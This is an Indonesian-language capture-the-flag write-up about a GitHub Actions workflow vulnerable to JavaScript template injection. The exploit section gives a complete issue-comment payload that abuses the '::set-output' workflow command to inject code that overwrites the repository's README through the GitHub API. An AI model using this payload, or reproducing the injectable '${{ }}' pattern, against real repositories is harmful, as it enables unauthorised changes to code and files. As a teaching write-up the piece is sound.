---
title: "[Writeup][CTF][GitHub] Privilege Escalation on GitHub Action"
date: '2021-06-14 04:00:00'
tags: ['ctf','github','writeup']
categories: ['writeup']
author: "fadhilthomas"
draft: false
---

![alt text](/github01/logo.svg)

Bulan Maret 2021, GitHub mengadakan *security competition*, yaitu Capture The Flag yang menjadikan Github Action Workflow sebagai tantangannya. 

Peserta diberikan sebuah repositori pribadi yang berisi sebuah Github Action Workflow dan file Readme yang hanya memiliki akses baca atau *pull* saja. Tujuan dari tantangan ini yaitu peserta diharuskan melakukan *update* file di repositori tersebut.

![alt text](/github01/github01.png)

## Problem
```yaml
name: log and process issue comments
on:
  issue_comment:
    types: [created]

jobs:
  issue_comment:
    name: log issue comment
    runs-on: ubuntu-latest
    steps:
      - id: comment_log
        name: log issue comment
        uses: actions/github-script@v3
        env:
          COMMENT_BODY: ${{ github.event.comment.body }}
          COMMENT_ID: ${{ github.event.comment.id }}
        with:
          github-token: "deadc0de"
          script: |
            console.log(process.env.COMMENT_BODY)
            return process.env.COMMENT_ID
          result-encoding: string
      - id: comment_process
        name: process comment
        uses: actions/github-script@v3
        timeout-minutes: 1
        if: ${{ steps.comment_log.outputs.COMMENT_ID }}
        with:
          script: |
            const id = ${{ steps.comment_log.outputs.COMMENT_ID }}
            return ""
          result-encoding: string
```

## Analysis
Sesuai dengan namanya, Github Action di atas memiliki *flow* untuk melakukan *logging* dari komentar pada *issue* yang sudah dibuat. Pada *step* pertama, Github Action memiliki env yaitu `COMMENT_BODY` dan `COMMENT_ID`. Kemudian ia akan melakukan *logging* isi dari badan komentar menggunakan console.log. 

Pada step kedua, terdapat pengecekan kondisi apabila keluaran dari `COMMENT_ID` pada step pertama bernilai `true` atau `1`, maka Github Action akan mengeksekusi script berikut ```const id = ${{ steps.comment_log.outputs.COMMENT_ID }}``` yang mana, terdapat celah keamanan yaitu *javascript template injection*. 

Namun sebelum bisa memanfaatkan celah *template injection*, terlebih dahulu harus memenuhi kondisi `COMMENT_ID == true`. Dalam [dokumentasi GitHub](https://docs.github.com/en/actions/reference/workflow-commands-for-github-actions#stopping-and-starting-workflow-commands), *workflow runner* akan mengeksekusi *workflow* command melalui `stdout` yaitu `console.log`, dan dalam [dokumentasi GitHub](https://docs.github.com/en/actions/reference/workflow-commands-for-github-actions#setting-an-output-parameter) juga terdapat command yang dapat membagikan nilai *variable* antar *workflow* melalui command `set-output`.

## Exploit
Untuk memperbarui file `README.md` yang ada dalam repositori, maka tambahkan *script* berikut pada komentar *issue*:
```yaml
::set-output name=COMMENT_ID::1;
await github.request('PUT /repos/{owner}/{repo}/contents/{path}', 
{ 
  owner: 'incrediblysecureinc', 
  repo: 'incredibly-secure-fadhilthomas',
  path: 'README.md',
  message: 'update: escalation',
  content: 'dGFrZW5z',
  sha: '4183b7e35a40d11acf98bad686ed2f6834cd71d0' 
})
```
Penjelasan dari *script* di atas sebagai berikut:

 - `::set-output name=COMMENT_ID::1;` berfungsi untuk mengirimkan nilai `COMMENT_ID` ke step kedua untuk memenuhi pengecekan kondisi.
 - `github.request('PUT /repos/{owner}/{repo}/contents/{path}` merupakan [GitHub REST API](https://docs.github.com/en/rest/reference/repos#create-or-update-file-contents) untuk memperbarui file.

Hasil dari script di atas adalah file `README.md` berhasil diperbarui sesuai dengan tujuan dari tantangan ini.
![alt text](/github01/github02.png)

## References
1. https://docs.github.com/en/actions/reference/workflow-commands-for-github-actions#stopping-and-starting-workflow-commands
2. https://docs.github.com/en/actions/reference/workflow-commands-for-github-actions#setting-an-output-parameter
3. https://docs.github.com/en/rest/reference/repos#create-or-update-file-contents
